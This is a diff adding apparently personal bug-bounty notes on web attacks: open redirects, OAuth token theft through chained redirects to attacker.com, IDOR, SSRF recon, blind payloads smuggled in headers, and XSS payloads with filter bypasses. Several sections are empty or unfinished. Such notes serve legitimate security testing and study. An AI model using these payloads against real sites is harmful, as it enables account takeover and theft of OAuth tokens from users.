@@ -1,0 +1,161 @@
+
+Common Tips
+- try changing all the values/headers of req one by one, if u found something common pattern in those values try bruteforcing them
+- try changing the requesting UID cookie value for the request to the main HTML page of an article. 
+- If attacker.com is blacklisted, but localhost is whitelisted, => localhost.attacker.com is the answer
+- We can send GET requests with blind xss/blind sqli/blind rce/burp collaborator. inside Referer, User-Agent, Cookies, custom headers, etc. To check if any information is sent to our specified payload/website or as a reset passwd link
+- After ls, I executed the ifconfig command and thus, I found that I have a connection of internal machine.
+- we can try changing the value sent to the server and by understanding the error we can exploit it, like eg. the values sent was used in the url to make request on behalf of user
+- using a URL like //example.com/script.js will point to either http://example.com/script.js or https://example.com/script.js depending on whether or not the URL originates from a http or https URL. 
+- //path is as different from /path as /foo/path and ///path. There is a "subdirectory" with no name in //path, which is valid. So if you set a cookie for //path, it cannot be read from /path, nor the other way around. :) .Sometimes this may work but some browsers ignore double slash and consider it as a single slash
+Reconnaissance
+- bruteforce more when u get 403 on that path
+	
+HTTP Parameter Pollution
+- https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf
+- https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/
+- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution
+HTTP fingerprinting 
+- whatweb
+SSRF
+- Searching for SSRF/open redirect? Try this one liner:
+gau https://t.co/K2siOOQ68X -s  | head -n 5000 > google.txt; cat google.txt | sort -u | grep -a -i \=http > google_redirects.txt
+
+IDOR
+- reset password endpoint is a common place to find idor
+	- if it is sending an email for changing password
+		- check the expiration of that link after resetting the password
+		- try to decode the  link, if some param/value is used for identifying the user try to find if any endpoint is leaking that param or value
+		- I also found out that it is incredibly easy to find out peoples userIDs all you have to do is navigate to their profile and search for “{\”id\”:” in the HTML code of the webpage to find out their userID
+Subdomain takeover:
+- check the domains which 
+Parameter Tampering
+parameters carry specific data to-and-fro client and server and if a manipulated data is sent to the server and the server did not verify that data or process it securely it can cause an application to be manipulated in a malicious manner, this is known as Parameter Tampering Attack.
+- try changing the param
+Broken authentication
+
+- I notice that when someone does the registration process, the system does not verify the registered email. Also when we do that the user will get a verification email to verify and if the victim clicks to verify then the new detail will be updated into the victim account.
+- in response it was invalid credentials status code: 400,here I was not disappointed what I did is I just paste the response of my true credentials of first account and I forward the request.
+Oauth
+- https://tools.ietf.org/html/rfc6749
+Open Redirection
+	Methodology
+	- search for 302 in burpsuite filter then find for open redirects
+	- https://blog.blackfan.ru/2017/09/devtwittercom-xss.html (Must see Whenever u try for open redirection) 
+	Tips
+	- href="https://uber.com/stylesheets/../en//example.com/css-code.css#.css"
+	- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
+	- Open redirect at https://inventory.upserve.com/http://google.com/ to http://google.com/
+	- redirection can happen by specifying the location in headers(from server side) and from javascript code(client side)
+	-  However, in most modern browsers this only works when the redirection is JavaScript based. That means that a location header with javascript: will not execute the code and might show an error message instead.
+	Example
+	- When logging into central.uber.com, the state parameter for login.uber.com contained a redirect location instead of a CSRF token.As a result, an attacker could modify the state parameter to have a poisoned central.uber.com path which would redirect to a custom domain after login and allow them to steal an account OAuth access token.
+	- 
+	  Example URL to controlling API request: uber.com/careers/list/-CONTROLLED-/
+	  Browser try to load JSON content from: uber.com/api/jobs/-CONTROLLED-
+	  
+	  Sending API requests to another domain: uber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/
+	  Browser try to load JSON content from:uber.com/en//example.com/file.json >>> example.com/file.json
+	- 
+	- If an attacker would change the redirect_uri to https://attacker.com/oauth the request would be denied directly, as it is an external domain. However, if the attacker would find an open redirect on the accepted domain, it might be possible to combine those.
+	  		facebook.com/oauth.php?clientid=123&state=abc&redirect_url=https://yourdomain.com/red.php?url%3dhttps://attacker.com/
+	  		which causes a redirect to
+	  		https://yourdomain.com/red.php?url=https://attacker.com/?code=xyz
+	  		which in turn causes a redirect to
+	  		https://attacker.com/?code=xyz
+Request headers
+
+Cookies
+- they are key-value pairs
+- sent to client by server/js to reside on client for specific time purpose
+- cookies has a domain pattern eg cookies set for test.example.com  can set cookies for example.com (parent domain) and foo.test.example.com (its subdomains) but cant set for test2.example.com (sibling subdomain)
+- cookies added to a domain can be read by the domain and its subdomains 
+- flags are sent by the server to client for seccurity purposes
+	- Secure: cookie is available only to https pages
+	- HTTPonly: cookie cannot be read by js 
+
+HTML
+- html nowadays is parsed according to html5 spec 
+- html is also parsed by web application firewalls and other filters, if there is a difference in the parsing of browser and the firewall then there might arise a vulnerability for eg 
+  
+- Legacy Parsing
+	- <script> tag will automatically be closed at the end of the page
+	- a tag missing its closing angle bracket will be closed by the angle bracket of the next tag on the page
+	- 
+	- 
+Content Sniffing
+- Mime sniffing
+	- (not common anymore)the browser will not only look at the content type which is sent by the server but also the contents of the page, if the contents look like html then the browser parses it as html
+- Encoding sniffing
+	- the browsers will try to find the type of encoding of a character which is not in the specified encoding type, if we know what the character is converted into then we can bypass filters/alter the parsing of html
+Same Origin Policy
+- xmlhttpreq is also called as ajax req
+- sop defines what domains i can contact via xhr
+- access of dom across separate windows/frames
+- Loosening the sop
+	- changing the document.domain, for accessing the subdomains of parent domain i.e by changing the domain of the subdomain
+	- using postmessage we can access other domains i.e sending a data along with the intended domain name, then the 2nd domain will recieve that message and use that data for some code, anyone can call postmessage into an iframe.
+	- cors can get us the cookies of other domains
+Web Cache Deception
+
+
+
+Edge side include injection
+https://www.youtube.com/watch?v=oBKoocE5id4&t=693s
+- 
+  Working of edge side include
+
+Concepts
+Proxy : that takes request of all devices and sents them to internet for response with proxy being the client for the servers
+
+ above are the uses of proxy(forward proxy)
+Reverse Proxy: it lies at the server side, it is where the requests of the clients arrive and reverse proxy decides to which server the request should be sent
+
+
+
+XSS
+
+testing for XSS
+1)fill the input with ur simple string
+1. Input fields in the page
+2. Url param
+3. Url paths
+2)After they are reflected in source code or dom..
+Test string can contain strings like <,",' but use them one by one, sometimes using all at the same time can trigger any filter or different logic
+3)Now our test string may be reflected as same string or sanitized in src code or dom 
+- Reflects in src code:
+	- Outside script block
+	- If string lands in the comment, we can break from it using --> or -!>
+	- If it lands in any anchor tag containing "href" or "src" attributes then we can use "javascript:alert(1)"
+		- between the tags ex.
+		  
+		- Intag htmli
+		  
+		- Intag htmli(without breaking tag),we can use an appropriate event for that particular tag
+		  
+		  
+	- Inside script block
+		- We can exit the script tag using </script> and do some html injection, because html elements are executed first
+		  
+		- Normal js injection- sometimes script tag is filtered then we can use this
+		  
+		- Escaped js injection- sometimes backslash is added to make the special char look like string 
+		  
+		  in this situation we can add one more backslash to remove the default backslash and execute our code
+		  
+		- Quotless js injection - when the reflection of input is in multiple places and are on the same line(var a = ‘-alert(1)//\’; var b = ‘-alert(1)//\’;)
+
+
+
+- A simple XSS Bypass 
+	Payload '"></script><img src=x onerror=prompt(`XSSED`)>
+	blocked as : '"> script><img src=x onerror=prompt(`XSSED`)>
+- This means that once we use entities inside an SVG's <script> element (or any other CDATA element), they will be parsed as if they were used in canonical representation. Therefore, to bypass the filter, the solution is to call prompt(1) with the open parenthesis char ( encoded, i.e. &#x28; or even shorter &#40;. One can also use &lpar; of course.
+
+Bypass: '"><%252fscript><img src=x onerror=prompt(`XSSED`)>
+
+payloads
+1. (alert)(1)
+
+
+			
